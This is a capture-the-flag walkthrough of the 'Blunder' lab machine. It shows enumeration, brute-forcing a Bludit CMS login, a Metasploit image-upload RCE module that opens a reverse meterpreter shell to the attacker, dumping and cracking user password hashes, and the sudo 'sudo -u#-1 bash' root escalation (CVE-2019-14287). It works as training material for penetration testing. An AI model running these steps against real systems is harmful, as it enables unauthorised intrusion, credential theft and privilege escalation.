# Blunder room

export IP=10.10.10.191

## 1 - Issue nmap scan

cmd: nmap -sC -sV -v -oN nmap/initial $IP

```
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

No ssh... hummm...

## 2 - checking web page

Blog with random things <br>
Source code is the standard  <br>

Suggest that have robots page... lets issue gobuster

## 3 - issue gobuster

cmd: gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/second -t 100 -x php,html,txt

```
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/0 (Status: 200)
/LICENSE (Status: 200)
/about (Status: 200)
/admin (Status: 301)
/cgi-bin/ (Status: 301)
/empty (Status: 200)
/install.php (Status: 200)
/prueba1 (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200) (NOTHIN)
/server-status (Status: 403)
/todo.txt (Status: 200) (CHECK)
/usb (Status: 200)

```

## 4 - Search

TODO.txt content

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
Fergus might be a username.
<br>
The admin page has a title "Bludit" which have a path traversal CVE for admins (i'm assuming it needs login?!?!) <br>
login page had XSS (but not aplicable i guess, no target to activate the XSS) <br>

search: bludit admin vulns
Result: Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass 
src: https://www.exploit-db.com/download/48746

## 5 - Try the exploit

Generate a password list based in the website contents (since the other did not provide results)

```
cewl -w brute.txt -m 5 $IP
```

Creds
```
fergus:RolandDeschain
```

## 6 - login and check 

Not much to do in the dashboard:
- create new content (the most interesting)

Lets try the path traversal CVE
```
/plugin-backup-download?file=../../../index.php
```

It does not work!

Lets search... Another CVE (RCE by uploading .php as .jpeg)

```
msfconsole

search bludit
use exploit/linux/http/bludit_upload_images_exec
set RHOSTS 10.10.10.191
set BLUDITUSER fergus
set BLUDITPASS RolandDeschain
set LHOST 10.10.15.104

run
meterpreter > shell

whoami
$ www-data
```

## 7 - Check files

Try to find flags (user.txt)

```
find / -type f -iname "user.txt" -print 2>/dev/null 

/home/hugo/user.txt
cat /home/hugo/user.txt
Denied
```

So i went ahead a tried all with .txt extension, and one file stood out

```
find / -type f -iname "*.txt" -print 2>/dev/null 

/ftp/note.txt

```
since the machine has python, lets launch a simplehttp server and get all the files from the FTP folder
<br>

```
cd /ftp
ls -la 
-rw-r--r--  1 root   root    10899227 Nov 27  2019 D5100_EN.pdf
-rw-r--r--  1 root   root      271056 Nov 27  2019 config
-rw-r--r--  1 root   root         828 Nov 27  2019 config.json
-rw-r--r--  1 root   root         260 Nov 27  2019 note.txt

```

note.txt content
```
Hey Sophie
I've left the thing you're looking for in here for you to continue my work
when I leave. The other thing is the same although Ive left it elsewhere too.

Its using the method we talked about; dont leave it on a post-it note this time!

Thanks
Shaun
```

config.json content
```
{
  "squadName": "Super hero squad",
  "homeTown": "Metro City",
  "formed": 2016,
  "secretBase": "Super tower",
  "active": true,
  "members": [
    {
      "name": "Molecule Man",
      "age": 29,
      "secretIdentity": "Dan Jukes",
      "powers": [
        "Radiation resistance",
        "Turning tiny",
        "Radiation blast"
      ]
    },
    {
      "name": "Madame Uppercut",
      "age": 39,
      "secretIdentity": "Jane Wilson",
      "powers": [
        "Million tonne punch",
        "Damage resistance",
        "Superhuman reflexes"
      ]
    },
    {
      "name": "Eternal Flame",
      "age": 1000000,
      "secretIdentity": "Unknown",
      "powers": [
        "Immortality",
        "Heat Immunity",
        "Inferno",
        "Teleportation",
        "Interdimensional travel"
      ]
    }
  ]
}
```

Lets upload the linpeas to enumerate and check if something appears...

```

var/www/bludit-3.10.0a/bl-content/databases/security.php:        "Password0": { (MANY ENTRIES LIKE THIS)
```

Lets check the bludit databases...

3.9.2
```
(...)
-rw-r--r-- 1 www-data www-data 43059 Sep 30 23:40 security.php (has login attempts)
(...)
-rw-r--r-- 1 www-data www-data  1268 Apr 28 11:20 users.php (contain some users)
```

Users.php (3.9.2)

```
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}

```

Lets try to crack it (https://crackstation.net/)
```
user: admin
Hash: 5dde2887e7aca:bfcc887f62e36ea019e3295aafb8a3885966e265
Result: Not found
```

Lets check the other bludit <br>
It has the same files

users.php (3.10)
```
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

lets try to crack it (oh, no salt!!!)
```
user: hugo
hash: faca404fd5c0a31cf1897b823c695c85cffeb98d 
result: Password120


su hugo
Password: Password120

whoami 
hugo
```

## 8 - get user flag

is in his home folder...

```
cat /home/hugo/user.txt
FLAG: 60e4ba13b729d7b0a0184b05305c7e7b
```


## 9 - checking sudo permissions

```
sudo -l

(ALL, !root) /bin/bash
```

This is exploitable with CVE-2019-14287
```
sudo -u#-1 bash

whoami 
# root


cat /root/root.txt
FLAG: d2b5c7e8168970b42763eb7a9e95690b
```
